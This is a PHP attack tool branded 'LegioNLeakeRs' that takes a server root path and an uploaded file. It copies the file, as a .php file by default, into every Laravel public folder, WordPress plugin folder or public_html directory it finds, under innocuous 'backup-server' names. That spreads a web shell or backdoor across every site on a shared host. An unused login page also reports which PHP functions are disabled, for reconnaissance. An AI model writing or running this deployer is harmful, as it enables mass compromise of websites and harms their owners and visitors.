<?php
//e
define('CUSTOM_FOLDER_NAME', 'backup-server-sample');

try {
    if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["upload_form"])) {
        $rootPath = $_POST['root_path'] ?? '';
        $fileContent = $_FILES['local_file']['tmp_name'] ?? '';
        if (empty($rootPath)) {
            throw new Exception("Root path is empty!");
        }
        if (!is_dir($rootPath)) {
            throw new Exception("Invalid root directory: " . htmlspecialchars($rootPath));
        }

        $targetFolders = findTargetFolders($rootPath);
        if (empty($targetFolders)) {
            throw new Exception("No valid target folders found in: " . htmlspecialchars($rootPath));
        }

        if (empty($fileContent)) {
            throw new Exception("No file uploaded or upload error occurred!");
        }

        if (!is_uploaded_file($fileContent)) {
            throw new Exception("Invalid file upload attempt!");
        }

        $results = uploadFromLocalFile($targetFolders, $fileContent);
        displayResults($results);
        exit;
    }
    showUploadForm();
} catch (Exception $e) {
    throw new Exception("Error in Start Project: " . $e->getMessage());
}


function findTargetFolders($directory)
{
    $targetFolders = [];

    try {
        if (!is_dir($directory)) {
            throw new Exception("Directory not found: " . htmlspecialchars($directory));
        }

        $items = scandir($directory);
        if ($items === false) {
            throw new Exception("Failed to scan directory: " . htmlspecialchars($directory));
        }

        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;

            $path = $directory . DIRECTORY_SEPARATOR . $item;

            if (is_dir($path)) {


                try {
                    $targetPath = determineTargetPath($path);

                    if ($targetPath && !file_exists($targetPath)) {
                        if (!mkdir($targetPath, 0755, true)) {
                            throw new Exception("Failed to create directory: " . htmlspecialchars($targetPath));
                        }
                        $targetFolders[] = $targetPath;
                    }
                } catch (Exception $e) {
                    error_log("Error processing site folder {$path}: " . $e->getMessage());
                }
            }
        }
    } catch (Exception $e) {
        throw new Exception("Error in findTargetFolders: " . $e->getMessage());
    }

    return $targetFolders;
}


function determineTargetPath($sitePath)
{
    try {


        $laravelPublic = $sitePath . '/public';

        if (file_exists($sitePath . '/resources') && is_dir($laravelPublic)) {
            $target = $laravelPublic . '/' . CUSTOM_FOLDER_NAME;

            if (!is_writable($laravelPublic)) {
                throw new Exception("Public directory not writable: " . htmlspecialchars($laravelPublic));
            }
            return $target;
        }


        $wpPublic = $sitePath . '/public_html';
        if ((file_exists($wpPublic . '/wp-config.php') || (is_dir($wpPublic . '/wp-content')))) {
            $pluginsDir = $wpPublic . '/wp-content/plugins';
            if (!is_dir($pluginsDir)) {
                throw new Exception("WP plugins directory not found: " . htmlspecialchars($pluginsDir));
            }
            $target = $pluginsDir . '/' . CUSTOM_FOLDER_NAME;
            if (!is_writable($pluginsDir)) {
                throw new Exception("WP plugins directory not writable: " . htmlspecialchars($pluginsDir));
            }
            return $target;
        }


        if (is_dir($wpPublic)) {
            $target = $wpPublic . '/' . CUSTOM_FOLDER_NAME;
            if (!is_writable($wpPublic)) {
                throw new Exception("Public directory not writable: " . htmlspecialchars($wpPublic));
            }
            return $target;
        }


        $target = $sitePath . '/' . CUSTOM_FOLDER_NAME;
        if (!is_writable($sitePath)) {
            throw new Exception("Site directory not writable: " . htmlspecialchars($sitePath));
        }
        return $target;
    } catch (Exception $e) {
        throw new Exception("Error in determineTargetPath: " . $e->getMessage());
    }
}



function uploadFromLocalFile($folders, $tmpFile)
{
    if (!is_uploaded_file($tmpFile)) {
        die("Error: Invalid file upload!");
    }

    $tempPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . uniqid() . '_' . basename($_FILES['local_file']['name']);
    if (!move_uploaded_file($tmpFile, $tempPath)) {
        die("Error: Failed to process uploaded file!");
    }

    $fileContent = file_get_contents($tempPath);
    if ($fileContent === false) {
        @unlink($tempPath);
        die("Error: Failed to read temporary file!");
    }



    $results = [];
    foreach ($folders as $folder) {
        $randomFilename = 'backup_server_' . bin2hex(random_bytes(4)) . '.' . (pathinfo($_FILES['local_file']['name'], PATHINFO_EXTENSION) ?: 'php');
        $randomFilename = preg_replace('/[^a-zA-Z0-9\.\_\-]/', '', $randomFilename);
        $destPath = rtrim($folder, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $randomFilename;
        $success = false;

        if (@copy($tempPath, $destPath)) {
            $success = true;
        } else {
            $success = (file_put_contents($destPath, $fileContent) !== false);
        }

        if ($success) {
            $results[$destPath] = "Success (Upload)";
            @chmod($destPath, 0644);
        } else {
            $error = error_get_last();
            $results[$destPath] = "Upload failed: " . ($error['message'] ?? 'Unknown error');
        }
    }
    @unlink($tempPath);
    return $results;
}

function displayResults($results)
{
    echo '<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Result</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body data-bs-theme="dark">';

    echo '<div class="container mt-4"><div class="card"><div class="card-header" style="background-color: #7E30E1; color: #FFF;">
          <h4>Operation Results</h4></div><div class="card-body"><ul class="list-group">';

    foreach ($results as $path => $status) {


        echo '<li class="list-group-item">
              <div class="d-flex justify-content-between align-items-center">
                <div>
                  
                  <div class="text-muted small"><strong>Path:</strong> ' . htmlspecialchars($path) . '</div>
                </div>
                <span class="badge bg-' . (strpos($status, 'Success') !== false ? 'success' : 'danger') . '">'
            . htmlspecialchars($status) . '</span>
              </div>
              </li>';
    }

    echo '</ul></div></div></div></body></html>';
}
function showLoginForm($error = '')
{
?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ALiReZa-VakEr</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>

    <body data-bs-theme="dark">
        <div class="container mt-5">
            <div class="row">
                <div class="col text-center">
                    <h1 style="font-family: 'Courier New', Courier, monospace;color:#FF004D;font-weight:bolder">
                        << LegioNLeakeRs>>
                    </h1>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class="col-md-4">
                    <div class="card">
                        <div class="card-header text-white" style="background-color:#7E30E1">
                            <h4 class="mb-0">Authentication Required</h4>
                        </div>
                        <div class="card-body">
                            <?php if (!empty($error)): ?>
                                <div class="alert alert-danger"><?= htmlspecialchars($error) ?></div>
                            <?php endif; ?>
                            <form method="post">
                                <div class="mb-3">
                                    <label for="password" class="form-label">Password:</label>
                                    <input type="password" class="form-control" id="password" name="password" required>
                                </div>
                                <button type="submit" class="btn w-100" style="background-color: #7E30E1; color: #FFF;">Login</button>
                            </form>
                        </div>
                        <div class="card-footer">
                            <span style="font-family: 'Courier New', Courier, monospace;font-size:12px;">
                                LegioNLeakeRs &copy 2025
                            </span>
                        </div>
                    </div>
                </div>
            </div>
            <hr>
            <div class="row">
                <div class="col">
                    <?php
                    $disabled_functions = ini_get('disable_functions');
                    if (!empty($disabled_functions)) {
                        echo "Disabled Functions: " . "<span class='text-danger'>" . $disabled_functions . "</span>";
                    } else {
                        echo "<span class='text-success'>No functions are disabled.</span>";
                    }
                    ?>
                </div>
            </div>
        </div>
    </body>

    </html>
<?php
}

function showUploadForm()
{
?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>File Uploader For Wordpress</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>

    <body data-bs-theme="dark">
        <div class="container mt-4">
            <div class="row">
                <div class="col text-center">
                    <h1 style="font-family: 'Courier New', Courier, monospace;color:#FF004D;font-weight:bolder">
                        << LegioNLeakeRs>>
                    </h1>
                </div>
            </div>
            <div class="card">
                <div class="card-header" style="background-color: #7E30E1; color: #FFF;">
                    <h4>File Uploader For Wordpress</h4>
                </div>
                <div class="card-body">
                    <form method="post" enctype="multipart/form-data">
                        <input type="hidden" name="upload_form" value="1">

                        <div class="mb-3">
                            <label class="form-label">Root Directory Path (required):</label>
                            <input type="text" class="form-control" name="root_path" placeholder="/var/www/html" required>
                        </div>

                        <div class="mb-3">
                            <label class="form-label">Select File to Upload:</label>
                            <input type="file" class="form-control" name="local_file" required>
                        </div>


                        <button type="submit" class="btn" style="background-color: #7E30E1; color: #FFF;">Upload</button>
                    </form>
                </div>
            </div>
        </div>
    </body>

    </html>
<?php
}
